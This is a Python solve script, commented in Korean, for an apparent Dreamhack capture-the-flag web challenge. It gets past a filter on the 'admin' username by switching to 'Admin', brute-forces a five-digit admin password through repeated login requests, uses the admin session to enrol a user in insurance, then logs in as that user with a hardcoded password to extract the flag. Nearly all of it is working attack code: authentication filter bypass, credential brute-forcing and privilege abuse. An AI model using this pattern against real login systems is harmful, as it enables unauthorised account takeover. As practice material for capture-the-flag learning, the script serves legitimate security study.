import requests

# 대상 서버 URL (끝에 / 붙이지 마세요)
BASE_URL = "http://host8.dreamhack.games:10062" 

def solve():
    session = requests.Session()
    
    # 1. ID 우회 및 브루트포싱
    # 'admin'만 아니면 되므로 'Admin'으로 간단하게 우회 시도
    admin_id = "Admin" 
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Using Bypass ID: '{admin_id}'")
    print("[*] Starting Brute-force (00000-02000)...")

    found_pw = None

    for i in range(2001):
        pw = str(i).zfill(5)
        
        if i % 100 == 0:
            print(f"[DEBUG] Progress: {pw} / 02000...")

        data = {'id': admin_id, 'pw': pw}
        
        try:
            # allow_redirects=True (기본값)이므로 로그인 성공 시 '/'로 이동함
            res = session.post(f"{BASE_URL}/login", data=data, timeout=10)
            
            # 성공 판별 로직 강화
            # 1. 관리자 패널 텍스트 확인
            # 2. 혹은 "ID or Password is incorrect!" 메시지가 없는지 확인
            if "[ADMIN OVERRIDE]" in res.text:
                found_pw = pw
                print("\n" + "="*40)
                print(f"[+] Found Admin Password: {found_pw}")
                print(f"[+] Final URL: {res.url}")
                print("="*40 + "\n")
                break
                
            # 만약 "H4cker.."가 뜬다면 ID 우회가 실패한 것임
            if "H4cker.." in res.text:
                print(f"[!] ID Bypass Failed with '{admin_id}'. Try another one.")
                return

        except Exception as e:
            print(f"[!] Request Error at {pw}: {e}")
            continue

    if not found_pw:
        print("\n[-] Failed to find Admin password.")
        print("[?] Tip: 서버가 재시작되었거나, 'on' 필터에 걸렸는지 확인하세요.")
        return

    # 2. Gloria Martinez 보험 등록
    print("[*] Enrolling Gloria Martinez...")
    # 관리자 세션이 유지된 상태에서 GET 요청
    enroll_res = session.get(f"{BASE_URL}/add_insured", params={'target': 'gloria martinez'})
    
    if "보험에 등록되었습니다" in enroll_res.text:
        print("[+] Enrollment Successful.")
    else:
        print("[-] Enrollment Failed.")
        return

    # 3. 로그아웃 후 Gloria Martinez로 로그인하여 플래그 확인
    print("[*] Switching to Gloria Martinez account...")
    session.get(f"{BASE_URL}/logout")
    
    login_data = {'id': 'gloria martinez', 'pw': 'P@ssw0rd'}
    final_res = session.post(f"{BASE_URL}/login", data=login_data)
    
    if "DH{" in final_res.text or "SP{" in final_res.text:
        import re
        flag = re.findall(r"(?:DH|SP)\{[^}]+\}", final_res.text)
        print("\n" + "!"*40)
        print(f"[+] FLAG: {flag[0] if flag else 'Not Found'}")
        print("!"*40)
    else:
        print("[-] Flag not found. Is she insured?")
        # 보험 상태 디버깅 출력
        if "ACTIVE PROTECTION" in final_res.text:
            print("[DEBUG] Status is ACTIVE, but flag missing.")
        else:
            print("[DEBUG] Status is still NO COVERAGE.")

if __name__ == "__main__":
    solve()